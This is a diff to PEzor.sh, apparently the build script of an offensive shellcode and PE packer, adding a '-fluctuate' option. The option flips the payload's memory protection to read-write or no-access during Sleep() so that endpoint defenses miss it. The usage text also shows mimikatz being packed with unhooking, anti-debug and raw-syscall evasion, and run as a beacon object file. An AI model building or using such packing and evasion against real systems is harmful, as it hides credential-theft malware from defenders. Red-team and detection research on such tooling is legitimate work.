@@ -40,6 +40,7 @@ OUTPUT_FORMAT=exe
 OUTPUT_EXTENSION=exe
 CLEANUP=false
 SOURCES=""
+FLUCTUATE=false
 
 usage() {
     echo 'Usage PE:        ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] [-rx] [-format=<FORMAT>] <executable.exe> [donut args]'
@@ -65,6 +66,7 @@ OPTIONS
   -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
+  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
   [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2
 
 EXAMPLES
@@ -74,6 +76,10 @@ EXAMPLES
   $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
+  # 64-bit (fluctuate to READWRITE when sleeping)
+  $ PEzor.sh -fluctuate=RW -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
+  # 64-bit (fluctuate to NOACCESS when sleeping)
+  $ PEzor.sh -fluctuate=NA -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
   # 64-bit (beacon object file)
   $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (beacon object file w/ cleanup)
@@ -115,6 +121,7 @@ OPTIONS
   -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
+  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
 
 EXAMPLES
   # 64-bit (self-inject RWX)
@@ -125,6 +132,10 @@ EXAMPLES
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin
+  # 64-bit (fluctuate to READWRITE when sleeping)
+  $ PEzor.sh -fluctuate=RW shellcode.bin
+  # 64-bit (fluctuate to NOACCESS when sleeping)
+  $ PEzor.sh -fluctuate=NA shellcode.bin
   # 64-bit (beacon object file)
   $ PEzor.sh -format=bof shellcode.bin
   # 64-bit (beacon object file w/ cleanup)
@@ -231,6 +242,10 @@ do
         -sdk=*)
             SDK="${arg#*=}"
             echo "[?] .NET SDK: $SDK"
+            ;;
+        -fluctuate=*)
+            FLUCTUATE="${arg#*=}"
+            echo "[?] Fluctuate: $FLUCTUATE"
             ;;
         *)
             echo "[?] Processing $arg"
@@ -409,6 +424,14 @@ case $OUTPUT_FORMAT in
             CPPFLAGS="$CPPFLAGS -D_CLEANUP_"
         fi
 
+        if [ $FLUCTUATE = "rw" ] || [ $FLUCTUATE = "RW" ]; then
+            CCFLAGS="$CCFLAGS -DFLUCTUATE -DFLUCTUATE_RW"
+            CPPFLAGS="$CPPFLAGS -DFLUCTUATE -DFLUCTUATE_RW"
+        elif [ $FLUCTUATE = "na" ] || [ $FLUCTUATE = "NA" ]; then
+            CCFLAGS="$CCFLAGS -DFLUCTUATE -DFLUCTUATE_NA"
+            CPPFLAGS="$CPPFLAGS -DFLUCTUATE -DFLUCTUATE_NA"
+        fi
+
         if [ $OUTPUT_FORMAT = "dll" ]; then
             CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT"
             CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT"
@@ -439,6 +462,10 @@ case $OUTPUT_FORMAT in
         if [ $UNHOOK = true ]; then
             $CC $CCFLAGS -c $INSTALL_DIR/loader.c -o $TMP_DIR/loader.o &&
             SOURCES="$SOURCES $TMP_DIR/loader.o"
+        fi
+
+        if [ $FLUCTUATE = "rw" ] || [ $FLUCTUATE = "RW" ] || [ $FLUCTUATE = "na" ] || [ $FLUCTUATE = "NA" ]; then
+            SOURCES="$SOURCES $INSTALL_DIR/fluctuate.cpp"
         fi
 
         if [ $OUTPUT_FORMAT = "bof" ]; then
